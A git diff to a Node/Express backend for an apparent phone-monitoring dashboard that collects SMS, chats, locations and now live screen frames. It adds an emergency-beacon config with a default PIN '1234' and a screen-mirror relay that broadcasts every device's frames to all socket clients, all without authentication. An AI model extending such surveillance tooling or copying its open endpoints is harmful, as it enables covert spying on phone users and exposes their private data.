@@ -8,6 +8,7 @@ require('dotenv').config();
 
 const usageRoutes = require('./routes/usage');
 const mediaRoutes = require('./routes/media');
+const browserRoutes = require('./routes/browser');
 
 const app = express();
 const server = http.createServer(app);
@@ -25,6 +26,7 @@ app.get('/health', (req, res) => {
 
 app.use('/api', usageRoutes);
 app.use('/api', mediaRoutes);
+app.use('/api', browserRoutes);
 
 // ---- Commands (dashboard sets, phone polls) ----
 const audioCommands = new Map();
@@ -98,6 +100,9 @@ const sms = loadMapFromFile('sms.json');
 const locations = loadMapFromFile('location.json');
 const locationHistory = loadMapFromFile('location_history.json');
 const chats = loadMapFromFile('chats.json');
+const media = loadMapFromFile('media.json');
+const emergencyConfigs = loadMapFromFile('emergency_config.json');
+const emergencyLogs = loadMapFromFile('emergency_logs.json');
 
 const CHAT_PACKAGE_NAMES = {
   'com.whatsapp': 'WhatsApp',
@@ -253,7 +258,113 @@ app.get('/api/chats/:deviceId', (req, res) => {
   res.json({ chats: clean });
 });
 
-// ---- Real-time Location Tracking ----
+// ---- Offline Emergency SMS Beacon Config & Logs ----
+app.get('/api/emergency-config/:deviceId', (req, res) => {
+  const { deviceId } = req.params;
+  const cfg = emergencyConfigs.get(deviceId) || {
+    parentPhone: '',
+    pin: '1234',
+    autoBeaconEnabled: false,
+    beaconIntervalMin: 30
+  };
+  res.json(cfg);
+});
+
+app.post('/api/emergency-config/:deviceId', (req, res) => {
+  const { deviceId } = req.params;
+  const { parentPhone, pin, autoBeaconEnabled, beaconIntervalMin } = req.body;
+  const prev = emergencyConfigs.get(deviceId) || {};
+  const updated = {
+    parentPhone: parentPhone !== undefined ? String(parentPhone).trim() : (prev.parentPhone || ''),
+    pin: pin !== undefined ? String(pin).trim() : (prev.pin || '1234'),
+    autoBeaconEnabled: autoBeaconEnabled !== undefined ? !!autoBeaconEnabled : (prev.autoBeaconEnabled || false),
+    beaconIntervalMin: beaconIntervalMin ? Number(beaconIntervalMin) : (prev.beaconIntervalMin || 30),
+    updatedAt: Date.now()
+  };
+  emergencyConfigs.set(deviceId, updated);
+  saveMapToFile(emergencyConfigs, 'emergency_config.json');
+  console.log(`[EmergencyConfig] Updated for ${deviceId}:`, updated);
+  res.json({ ok: true, config: updated });
+});
+
+app.post('/api/emergency-beacon-logs/:deviceId', (req, res) => {
+  const { deviceId } = req.params;
+  const { logs } = req.body;
+  if (!Array.isArray(logs)) return res.status(400).json({ error: 'invalid logs' });
+  if (!emergencyLogs.has(deviceId)) emergencyLogs.set(deviceId, []);
+  const arr = emergencyLogs.get(deviceId);
+  for (const item of logs) {
+    if (!arr.some(x => x.msg === item.msg)) {
+      arr.push(item);
+    }
+  }
+  if (arr.length > 500) arr.splice(0, arr.length - 500);
+  saveMapToFile(emergencyLogs, 'emergency_logs.json');
+  res.json({ ok: true });
+});
+
+app.get('/api/emergency-beacon-logs/:deviceId', (req, res) => {
+  const { deviceId } = req.params;
+  const arr = emergencyLogs.get(deviceId) || [];
+  res.json({ logs: arr.slice().reverse() });
+});
+
+// ---- Screen Mirror: frame store + commands ----
+const screenFrames = new Map();   // deviceId -> { buffer, width, height, at }
+const screenCommands = new Map(); // deviceId -> { command, fps }
+
+// Receive JPEG frame from device
+app.post('/api/screen-frame/:deviceId', (req, res) => {
+  const { deviceId } = req.params;
+  const chunks = [];
+  req.on('data', chunk => chunks.push(chunk));
+  req.on('end', () => {
+    const buf = Buffer.concat(chunks);
+    if (!buf.length) return res.status(400).json({ error: 'empty' });
+    const w = req.headers['x-width'] || '720';
+    const h = req.headers['x-height'] || '1280';
+    screenFrames.set(deviceId, { buffer: buf, width: parseInt(w), height: parseInt(h), at: Date.now() });
+    // Emit via socket.io for real-time dashboard
+    if (io) {
+      const b64 = buf.toString('base64');
+      io.emit('screen-frame', { deviceId, frame: b64, width: parseInt(w), height: parseInt(h), at: Date.now() });
+    }
+    res.json({ ok: true });
+  });
+  req.on('error', () => res.status(500).json({ error: 'stream error' }));
+});
+
+// Serve latest JPEG frame as image (dashboard polls this)
+app.get('/api/screen-frame/:deviceId', (req, res) => {
+  const { deviceId } = req.params;
+  const data = screenFrames.get(deviceId);
+  if (!data) return res.status(404).json({ error: 'no frame' });
+  // Accept header check: if json requested return metadata
+  if (req.headers['accept'] && req.headers['accept'].includes('application/json')) {
+    return res.json({ at: data.at, width: data.width, height: data.height, hasFrame: true });
+  }
+  res.setHeader('Content-Type', 'image/jpeg');
+  res.setHeader('Cache-Control', 'no-store');
+  res.setHeader('X-Frame-Width', data.width);
+  res.setHeader('X-Frame-Height', data.height);
+  res.setHeader('X-Frame-At', data.at);
+  res.send(data.buffer);
+});
+
+// Dashboard sets command; device polls
+app.post('/api/screen-command/:deviceId', (req, res) => {
+  const { deviceId } = req.params;
+  const { command, fps } = req.body;
+  screenCommands.set(deviceId, { command: command || '', fps: fps || 7 });
+  console.log(`[ScreenCmd] ${deviceId}: ${command}`);
+  res.json({ ok: true });
+});
+
+app.get('/api/screen-command/:deviceId', (req, res) => {
+  const { deviceId } = req.params;
+  const cmd = screenCommands.get(deviceId) || { command: '', fps: 7 };
+  res.json(cmd);
+});
 app.post('/api/location/:deviceId', (req, res) => {
   const { deviceId } = req.params;
   const loc = req.body;
@@ -398,6 +509,19 @@ app.post('/api/debug/log', (req, res) => {
 app.get('/api/debug/log', (req, res) => {
   res.json({ logs: debugLogs });
 });
+
+// Serve built dashboard static files if dist exists
+const distPath = fs.existsSync(path.join(__dirname, '..', 'public'))
+  ? path.join(__dirname, '..', 'public')
+  : path.join(__dirname, '..', '..', 'dashboard', 'dist');
+if (fs.existsSync(distPath)) {
+  app.use(express.static(distPath));
+  app.get('*', (req, res, next) => {
+    if (req.path.startsWith('/api') || req.path.startsWith('/health')) return next();
+    res.sendFile(path.join(distPath, 'index.html'));
+  });
+  console.log('[Dashboard] Serving dashboard from', distPath);
+}
 
 server.listen(PORT, () => {
   console.log(`Backend running on http://localhost:${PORT}`);
